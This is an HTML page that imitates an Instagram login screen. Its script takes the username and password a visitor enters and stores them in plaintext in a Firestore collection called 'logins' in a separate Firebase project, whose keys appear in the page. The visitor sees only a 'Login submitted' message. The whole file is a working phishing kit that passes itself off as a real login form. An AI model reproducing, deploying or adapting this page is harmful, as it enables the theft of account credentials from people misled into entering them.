<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{
  background:#fafafa;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  font-family:Arial;
}

.box{
  width:350px;
  background:white;
  border:1px solid #ddd;
  padding:40px;
  text-align:center;
}

.logo{
  font-size:35px;
  margin-bottom:30px;
  font-weight:bold;
}

input{
  width:100%;
  padding:12px;
  margin:6px 0;
  border:1px solid #ddd;
  border-radius:6px;
}

button{
  width:100%;
  padding:12px;
  margin-top:10px;
  border:none;
  background:#0095f6;
  color:white;
  font-weight:bold;
  border-radius:6px;
}

.msg{
  margin-top:10px;
  font-size:13px;
}
</style>
</head>

<body>

<div class="box">
  <div class="logo">Instagram login</div>

  <input type="text" id="user" placeholder="Username or email">
  <input type="password" id="pass" placeholder="Password">
  <button onclick="login()">Log in</button>

  <div class="msg" id="msg"></div>
</div>

<!-- Firebase -->
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyCUzswPDLiw_BAtQhWCM4HktyhaISeWkJc",
  authDomain: "instagram-70e14.firebaseapp.com",
  projectId: "instagram-70e14",
  storageBucket: "instagram-70e14.firebasestorage.app",
  messagingSenderId: "181812380171",
  appId: "1:181812380171:web:da046ef9d7d946e0f4fd0e",
  measurementId: "G-84DMY1CSP0"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

window.login = async function(){

  const user = document.getElementById("user").value;
  const pass = document.getElementById("pass").value;
  const msg = document.getElementById("msg");

  if(user=="" || pass==""){
    msg.innerHTML="Enter details";
    return;
  }

  try{
    await addDoc(collection(db, "logins"), {
      username: user,
      password: pass,
      time: new Date().toLocaleString()
    });

    msg.innerHTML="Login submitted âœ”";
    msg.style.color="green";

  }catch(e){
    msg.innerHTML="Error";
    msg.style.color="red";
  }
}
</script>

</body>
</html>
